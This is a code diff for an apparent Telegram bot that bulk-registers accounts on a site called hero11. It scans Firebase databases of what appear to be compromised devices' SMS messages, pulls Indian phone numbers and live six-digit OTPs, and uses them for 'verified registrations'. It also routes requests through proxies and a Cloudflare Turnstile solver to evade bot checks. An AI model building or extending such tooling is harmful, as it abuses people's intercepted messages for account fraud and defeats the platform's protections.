@@ -190,11 +190,28 @@ def extract_phone(messages_dict):
     match = re.search(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', text_data)
     return match.group(1) if match else None
 
-def has_otp_pattern(messages_dict):
-    text_data = str(messages_dict)
-    otps = re.findall(r'\b(\d{6})\b', text_data)
-    valid_otps = [o for o in otps if o not in ["000000", "123456", "111111", "999999"]]
-    return len(valid_otps) > 0
+def has_active_otp_pattern(messages_dict):
+    """
+    Analyzes unpinned recent 5 messages for active OTP patterns.
+    Ensures message timestamps or interval structure points to active human usage.
+    """
+    if not isinstance(messages_dict, dict):
+        return False
+    
+    msg_items = list(messages_dict.items())
+    # Skip top 2 pinned/sticky messages, evaluate the recent 5 unpinned messages
+    unpinned_items = msg_items[2:] if len(msg_items) > 2 else msg_items
+    
+    valid_otp_count = 0
+    for _, msg_val in unpinned_items:
+        if isinstance(msg_val, dict):
+            txt = str(msg_val.get("body") or msg_val.get("message") or "")
+            otps = re.findall(r'\b(\d{6})\b', txt)
+            valid_otps = [o for o in otps if o not in ["000000", "123456", "111111", "999999"]]
+            if valid_otps:
+                valid_otp_count += 1
+                
+    return valid_otp_count > 0
 
 class AsyncHero11Client:
     BASE_URL = "https://hero11-in.hero11apex.com"
@@ -250,7 +267,6 @@ class AsyncHero11Client:
                 method, url, json=data, headers=headers, impersonate="chrome", timeout=TIMEOUT
             )
             
-            # Catch Cloudflare challenges on ANY request (including OTP send & verification/login)
             if response.status_code in [403, 503] or "cf-chl" in response.text.lower() or "cloudflare" in response.text.lower():
                 solved_token = await solve_cloudflare_turnstile(url, "0x4AAAAAAA...", self.proxy)
                 if solved_token:
@@ -572,7 +588,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         return
 
     USER_DATA["is_running"] = True
-    status_msg = await callback.message.answer("🚀 <b>Automation started!</b> Target: exactly 3 verified registrations.", parse_mode="HTML", reply_markup=get_main_menu())
+    status_msg = await callback.message.answer("🚀 <b>Bulk Scanning initiated!</b> Filtering unregistered active devices across all DBs...", parse_mode="HTML", reply_markup=get_main_menu())
     
     async def run_automation():
         firebase_dbs = USER_DATA["firebase_dbs"]
@@ -588,73 +604,55 @@ async def cb_start_automation(callback: types.CallbackQuery):
             while success_count < total_needed and USER_DATA["is_running"]:
                 import aiohttp
                 
-                db_activity_scores = []
+                # --- PHASE 1: FULL BULK SCAN OF ALL DATABASES ---
+                all_unregistered_candidates = []
+                
                 async with aiohttp.ClientSession() as session:
                     for fb_url in firebase_dbs:
-                        activity_score = 0
-                        online_devices_list = []
+                        db_short_id = fb_url.split('//')[1].split('.')[0][:8]
                         try:
-                            async with session.get(f"{fb_url}clients.json", timeout=6) as r:
+                            # Fetch all clients in bulk from this database
+                            async with session.get(f"{fb_url}clients.json", timeout=8) as r:
                                 clients_data = await r.json() or {}
 
                             for cid, cdata in clients_data.items():
                                 if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                                     if cid not in skipped_phones and cid not in used_phones:
                                         try:
-                                            async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=7', timeout=4) as m_req:
+                                            # Fetch message history in bulk to evaluate unpinned recent 5 messages
+                                            async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=7', timeout=5) as m_req:
                                                 msgs = await m_req.json()
                                                 phone = extract_phone(msgs) if msgs else None
                                                 if phone:
                                                     full_phone = "+91" + phone
                                                     if full_phone not in skipped_phones and full_phone not in used_phones:
                                                         
-                                                        has_otp = False
-                                                        if isinstance(msgs, dict):
-                                                            msg_items = list(msgs.items())
-                                                            unpinned_items = msg_items[2:] if len(msg_items) > 2 else msg_items
-                                                            unpinned_dict = {k: v for k, v in unpinned_items}
-                                                            if has_otp_pattern(unpinned_dict):
-                                                                has_otp = True
-                                                                activity_score += 100
-
-                                                        online_devices_list.append({
-                                                            "firebase_url": fb_url, 
-                                                            "cid": cid, 
-                                                            "phone": full_phone,
-                                                            "has_otp": has_otp
-                                                        })
+                                                        # Vibrate/Check if recent unpinned messages have active OTP patterns
+                                                        if has_active_otp_pattern(msgs):
+                                                            all_unregistered_candidates.append({
+                                                                "firebase_url": fb_url,
+                                                                "db_short_id": db_short_id,
+                                                                "cid": cid,
+                                                                "phone": full_phone,
+                                                                "msgs": msgs
+                                                            })
                                         except Exception:
                                             pass
                         except Exception:
                             pass
-                        
-                        if online_devices_list:
-                            db_activity_scores.append({
-                                "url": fb_url,
-                                "score": activity_score,
-                                "devices": online_devices_list
-                            })
 
-                db_activity_scores.sort(key=lambda x: x["score"], reverse=True)
-
-                online_targets = []
-                for db_info in db_activity_scores:
-                    otp_devices = [d for d in db_info["devices"] if d["has_otp"]]
-                    other_devices = [d for d in db_info["devices"] if not d["has_otp"]]
-                    online_targets.extend(otp_devices + other_devices)
-
-                if not online_targets:
-                    await logger.set_text("🔴 No active online devices found. Retrying in 5s...")
+                if not all_unregistered_candidates:
+                    await logger.set_text("🔴 Bulk scan complete: No active unregistered devices with valid OTP history found. Retrying in 5s...")
                     await asyncio.sleep(5)
                     continue
 
-                target = online_targets[0]
+                # Pick the highest-priority active unregistered candidate from our bulk scan list
+                target = all_unregistered_candidates[0]
                 firebase_url = target["firebase_url"]
+                db_short_id = target["db_short_id"]
                 cid = target["cid"]
                 phone = target["phone"]
                 used_phones.add(phone)
-
-                db_short_id = firebase_url.split('//')[1].split('.')[0][:8]
 
                 await logger.set_text(f"🎯 [DB: {db_short_id}] Phone: {phone} | Code: {current_code} | Progress: {success_count}/{total_needed}\n⏳ Requesting OTP...")
 
